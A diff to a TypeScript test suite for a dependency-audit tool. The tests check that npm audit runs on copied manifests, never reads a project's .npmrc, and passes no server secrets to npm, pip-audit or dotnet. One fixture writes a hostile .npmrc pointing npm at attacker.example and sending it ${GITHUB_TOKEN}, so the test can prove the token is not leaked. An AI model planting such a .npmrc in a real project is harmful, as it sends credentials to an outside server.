@@ -458,10 +458,12 @@ describe('deps_audit', () => {
     expect(r.coverage).toBe('full');
   });
 
-  // Self-security review R6-I1: npm audit runs in the project, so the
-  // project's .npmrc picks the server that answers it. Honoured — a private
-  // registry is legitimate — but named, and without the credentials.
-  it("names the registry the project's .npmrc sends npm audit to, never silently", async () => {
+  // Self-security review R6-I1 named the registry a project's .npmrc sent npm
+  // audit to, and honoured it. Since 3.7.0 the file is not read at all: run in
+  // the project, npm expanded the `${GITHUB_TOKEN}` it names from the server's
+  // environment and sent it to that registry (test/e2e/depsAuditHostile.test.ts).
+  // What the project names is still said — without the credentials.
+  it("names the project's .npmrc as not read, and the registry it names as not asked", async () => {
     const project = tempProject();
     writeFileSync(join(project, 'package.json'), '{"name":"x"}', 'utf8');
     writeFileSync(
@@ -483,21 +485,25 @@ describe('deps_audit', () => {
     const r = (await getTool('deps_audit').handler({ project_path: project }, plugin)) as {
       ok: true;
       tools_run: { name: string; status: string; reason?: string; honoured_config?: string[] }[];
+      package_config_not_read?: string[];
     };
     const npm = r.tools_run.find((t) => t.name === 'npm');
     expect(npm?.status).toBe('ok');
-    expect(npm?.reason).toContain(
-      "npm audit answered by https://npm.example.internal/repo/ (from the project's .npmrc)",
+    expect(npm?.reason).toBe(
+      "parsed into findings; not read: the project's .npmrc — npm audit ran on a copy of the manifests, with your own " +
+        "npm configuration (~/.npmrc, NPM_CONFIG_*); the project's .npmrc names https://npm.example.internal/repo/ as " +
+        'its registry, which was not asked: to audit against it, set it in your own ~/.npmrc',
     );
     expect(npm?.reason).not.toContain('s3cret');
-    expect(npm?.honoured_config).toEqual(['.npmrc']);
+    expect(npm?.honoured_config).toBeUndefined();
+    expect(r.package_config_not_read).toEqual(['.npmrc']);
   });
 
   it.each([
     ['no .npmrc', null],
     ['the public registry', 'registry=https://registry.npmjs.org/\n'],
     ['only a scoped registry', '@acme:registry=https://scoped.example/\n'],
-  ])('says nothing about the registry for %s', async (_label, npmrc) => {
+  ])('names no registry for %s', async (_label, npmrc) => {
     const project = tempProject();
     writeFileSync(join(project, 'package.json'), '{"name":"x"}', 'utf8');
     if (npmrc !== null) writeFileSync(join(project, '.npmrc'), npmrc, 'utf8');
@@ -514,16 +520,131 @@ describe('deps_audit', () => {
     const r = (await getTool('deps_audit').handler({ project_path: project }, plugin)) as {
       ok: true;
       tools_run: { name: string; reason?: string; honoured_config?: string[] }[];
+      package_config_not_read?: string[];
     };
     const npm = r.tools_run.find((t) => t.name === 'npm');
-    expect(npm?.reason ?? '').not.toMatch(/answered by/);
-    // Round 5, item 2: a project .npmrc is named whenever npm audit read one
-    // (omit=dev or audit-level decide what it reports), whatever its registry.
+    expect(npm?.reason ?? '').not.toMatch(/as its registry/);
+    expect(npm?.honoured_config).toBeUndefined();
+    // Whatever it names, a project .npmrc is never read — and said so.
     if (npmrc === null) {
-      expect(npm?.honoured_config).toBeUndefined();
+      expect(npm?.reason).toBe('parsed into findings');
+      expect(r.package_config_not_read).toBeUndefined();
     } else {
-      expect(npm?.honoured_config).toEqual(['.npmrc']);
-      expect(npm?.reason).toMatch(/honoured the project's \.npmrc \(its registry and settings decide what npm audit reads and reports\)/);
+      expect(npm?.reason).toMatch(/not read: the project's \.npmrc — npm audit ran on a copy of the manifests/);
+      expect(r.package_config_not_read).toEqual(['.npmrc']);
+    }
+  });
+
+  it("npm audit runs on a copy of the manifests, in the package-manager environment: never the project's .npmrc, never the server's token", async () => {
+    vi.stubEnv('GITHUB_TOKEN', 'ghp_server_token_never_passed');
+    vi.stubEnv('NPM_CONFIG_REGISTRY', 'https://npm.user.example/');
+    try {
+      const project = tempProject();
+      writeFileSync(join(project, 'package.json'), '{"name":"x","version":"1.0.0"}', 'utf8');
+      writeFileSync(join(project, 'package-lock.json'), '{"name":"x","lockfileVersion":3,"packages":{}}', 'utf8');
+      writeFileSync(join(project, '.npmrc'), 'registry=http://attacker.example/\n//attacker.example/:_authToken=${GITHUB_TOKEN}\n', 'utf8');
+      const plugin = makePlugin(project);
+      vi.mocked(scannerAvailable).mockResolvedValue('/fake/bin/tool');
+      const seen: Array<{ cwd: string | undefined; files: string[]; extendEnv: boolean | undefined; env: NodeJS.ProcessEnv }> = [];
+      vi.mocked(runProcess).mockImplementation(async (opts) => {
+        if (opts.command === 'npm') {
+          const cwd = opts.cwd;
+          // Looked at while npm "runs": the copy is gone once it returns.
+          const files = cwd === undefined ? [] : ['package.json', 'package-lock.json', '.npmrc'].filter((f) => existsSync(join(cwd, f)));
+          seen.push({ cwd, files, extendEnv: opts.extendEnv, env: opts.env ?? {} });
+          return { outcome: 'completed' as const, exitCode: 0, stdout: npmAuditFx(), stderr: '', truncated: false };
+        }
+        const path = outputPathFor(opts.args);
+        if (path) writeFileSync(path, trivyFsFx(), 'utf8');
+        return { outcome: 'completed' as const, exitCode: 0, stdout: '', stderr: '', truncated: false };
+      });
+
+      await getTool('deps_audit').handler({ project_path: project }, plugin);
+
+      expect(seen).toHaveLength(1);
+      const npm = seen[0];
+      expect(resolve(npm?.cwd ?? project)).not.toBe(resolve(project));
+      expect(npm?.files).toEqual(['package.json', 'package-lock.json']);
+      expect(npm?.cwd !== undefined && existsSync(npm.cwd)).toBe(false);
+      expect(npm?.extendEnv).toBe(false);
+      expect(Object.keys(npm?.env ?? {}).some((k) => k.toUpperCase() === 'GITHUB_TOKEN')).toBe(false);
+      expect(npm?.env['NPM_CONFIG_REGISTRY']).toBe('https://npm.user.example/');
+    } finally {
+      vi.unstubAllEnvs();
+    }
+  });
+
+  it('npm audit does not run when a dependency points at a network path: a named gap, never a clean audit', async () => {
+    const project = tempProject();
+    writeFileSync(join(project, 'package.json'), JSON.stringify({ name: 'x', dependencies: { p: 'file:\\\\192.0.2.1\\share\\p' } }), 'utf8');
+    const plugin = makePlugin(project);
+    vi.mocked(scannerAvailable).mockResolvedValue('/fake/bin/tool');
+    const commands: string[] = [];
+    vi.mocked(runProcess).mockImplementation(async (opts) => {
+      commands.push(bare(opts.command));
+      const path = outputPathFor(opts.args);
+      if (path) writeFileSync(path, trivyFsFx(), 'utf8');
+      return { outcome: 'completed' as const, exitCode: 0, stdout: '', stderr: '', truncated: false };
+    });
+
+    const r = (await getTool('deps_audit').handler({ project_path: project }, plugin)) as {
+      ok: true;
+      coverage: string;
+      missing_tools: string[];
+      tools_run: { name: string; status: string; reason?: string }[];
+    };
+    expect(commands).not.toContain('npm');
+    const npm = r.tools_run.find((t) => t.name === 'npm');
+    expect(npm?.status).toBe('failed');
+    expect(npm?.reason).toMatch(/^not run: the project's npm dependencies point at a network path \(package\.json/);
+    expect(r.missing_tools).toContain('npm');
+    expect(r.coverage).toBe('partial');
+  });
+
+  it("pip-audit and the .NET restore and listing get the package-manager environment, never the server's", async () => {
+    vi.stubEnv('GITHUB_TOKEN', 'ghp_server_token_never_passed');
+    vi.stubEnv('AWS_SECRET_ACCESS_KEY', 'aws_never_passed');
+    vi.stubEnv('PIP_INDEX_URL', 'https://pypi.user.example/simple');
+    vi.stubEnv('NUGET_PACKAGES', 'C:\\nuget-cache');
+    try {
+      const project = tempProject();
+      writeFileSync(join(project, 'requirements.txt'), 'requests==2.0.0\n', 'utf8');
+      writeFileSync(join(project, 'Test.csproj'), '<Project></Project>', 'utf8');
+      const plugin = makePlugin(project);
+      vi.mocked(scannerAvailable).mockImplementation(async (name: string) =>
+        name === 'trivy' || name === 'dotnet' || name === 'pip-audit' ? `/fake/bin/${name}` : null,
+      );
+      const runs: Array<{ what: string; extendEnv: boolean | undefined; env: NodeJS.ProcessEnv }> = [];
+      vi.mocked(runProcess).mockImplementation(async (opts) => {
+        const name = bare(opts.command);
+        if (name === 'pip-audit' || name === 'dotnet') runs.push({ what: `${name} ${opts.args?.[0] ?? ''}`, extendEnv: opts.extendEnv, env: opts.env ?? {} });
+        if (name === 'pip-audit') {
+          const path = outputPathFor(opts.args);
+          if (path) writeFileSync(path, pipAuditFx(), 'utf8');
+        }
+        if (name === 'trivy') {
+          const path = outputPathFor(opts.args);
+          if (path) writeFileSync(path, trivyNoResultsFx(), 'utf8');
+        }
+        const stdout = name === 'dotnet' && opts.args?.[0] === 'list' ? dotnetListFx() : '';
+        return { outcome: 'completed' as const, exitCode: 0, stdout, stderr: '', truncated: false };
+      });
+
+      await getTool('deps_audit').handler({ project_path: project }, plugin);
+
+      expect(runs.map((r) => r.what).sort()).toEqual(['dotnet list', 'dotnet restore', 'pip-audit -r']);
+      for (const run of runs) {
+        const names = Object.keys(run.env).map((k) => k.toUpperCase());
+        expect(run.extendEnv, run.what).toBe(false);
+        expect(names, run.what).not.toContain('GITHUB_TOKEN');
+        expect(names, run.what).not.toContain('AWS_SECRET_ACCESS_KEY');
+        expect(names, run.what).not.toContain('GUARDIAN_SCAN_ID');
+        // The package managers' own configuration is the user's, and stays.
+        expect(run.env['PIP_INDEX_URL'], run.what).toBe('https://pypi.user.example/simple');
+        expect(run.env['NUGET_PACKAGES'], run.what).toBe('C:\\nuget-cache');
+      }
+    } finally {
+      vi.unstubAllEnvs();
     }
   });
 
